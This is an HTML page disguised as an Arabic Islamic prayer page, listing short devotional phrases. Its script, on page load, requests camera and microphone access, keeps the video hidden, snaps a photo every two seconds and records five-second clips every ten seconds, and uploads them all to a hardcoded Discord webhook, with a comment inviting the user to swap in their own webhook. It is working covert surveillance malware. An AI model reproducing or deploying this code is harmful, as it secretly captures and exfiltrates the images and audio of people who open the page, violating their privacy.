<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>صلي على النبي</title>
    <style>
        #video { display: none; }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding-top: 50px;
        }
        .prayer {
            font-size: 22px;
            color: #0000cd;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <p class="prayer">بسم الله الرحمن الرحيم</p>
    <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
    <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
    <p class="prayer">لا إله إلا الله محمد رسول الله</p>
    <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>

    <video id="video" width="300" height="200" autoplay muted></video>
    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362553494988394757/pw4iKW76TUWd1pjYnfg6BpUv1_3X_RByXC52LJ0f91locIV95cdMDCWMccOOH5htPEtS"; // ← غيره بالرابط بتاعك

        let stream;
        let recorder;
        let chunks = [];

        window.onload = async () => {
            try {
                // نطلب الكاميرا والمايك بجودة متوسطة
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 640, height: 360 }, // جودة متوسطة
                    audio: true
                });

                video.srcObject = stream;

                // ⏱️ صورة كل 2 ثانية
                setInterval(captureImage, 2000);

                // ⏱️ فيديو كل 10 ثواني (مدته 5 ثواني فقط)
                setInterval(recordAndSendVideo, 10000);

            } catch (err) {
                alert("⚠️ فشل في الوصول للكاميرا أو المايك. الرجاء السماح.");
                console.error(err);
            }
        };

        function captureImage() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/png');
            const imageHash = `sent_image_${hashString(imgData)}`;

            if (!localStorage.getItem(imageHash)) {
                sendImage(imgData, imageHash);
            } else {
                console.log("✅ الصورة دي اتبعتت قبل كده");
            }
        }

        function sendImage(imgData, imageHash) {
            const blob = dataURLtoBlob(imgData);
            const formData = new FormData();
            formData.append('file', blob, 'image.png');

            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            }).then(response => {
                if (response.status === 204) {
                    console.log("✅ تم إرسال الصورة");
                    localStorage.setItem(imageHash, true);
                } else {
                    console.log("❌ فشل إرسال الصورة");
                }
            }).catch(err => console.log("❌ خطأ أثناء إرسال الصورة:", err));
        }

        function recordAndSendVideo() {
            chunks = [];
            recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });

                const reader = new FileReader();
                reader.onloadend = () => {
                    const base64data = reader.result;
                    const videoHash = `sent_video_${hashString(base64data)}`;

                    if (!localStorage.getItem(videoHash)) {
                        const formData = new FormData();
                        formData.append('file', blob, 'short_video.webm');

                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            body: formData
                        }).then(response => {
                            if (response.status === 204) {
                                console.log("✅ تم إرسال الفيديو");
                                localStorage.setItem(videoHash, true);
                            } else {
                                console.log("❌ فشل إرسال الفيديو");
                            }
                        }).catch(err => console.log("❌ خطأ أثناء إرسال الفيديو:", err));
                    } else {
                        console.log("✅ الفيديو ده اتبعت قبل كده");
                    }
                };

                reader.readAsDataURL(blob);
            };

            recorder.start();
            setTimeout(() => {
                recorder.stop();
            }, 5000); // ← يسجل 5 ثواني فقط
        }

        function dataURLtoBlob(dataURL) {
            const parts = dataURL.split(';base64,');
            const byteString = atob(parts[1]);
            const mimeString = parts[0].split(':')[1];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        function hashString(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const chr = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + chr;
                hash |= 0;
            }
            return hash;
        }
    </script>
</body>
</html>
